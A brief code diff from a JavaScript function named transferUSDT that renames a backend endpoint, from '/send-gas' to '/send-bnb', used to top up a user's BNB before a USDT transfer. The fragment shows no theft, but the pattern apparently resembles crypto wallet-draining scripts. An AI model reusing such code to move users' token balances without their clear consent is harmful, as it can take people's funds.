@@ -77,7 +77,7 @@ async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
     console.log("User BNB is low. Requesting BNB from backend...");
-    await fetch("https://bep20usdt-backend-production.up.railway.app/send-gas", {
+    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ to: userAddress })
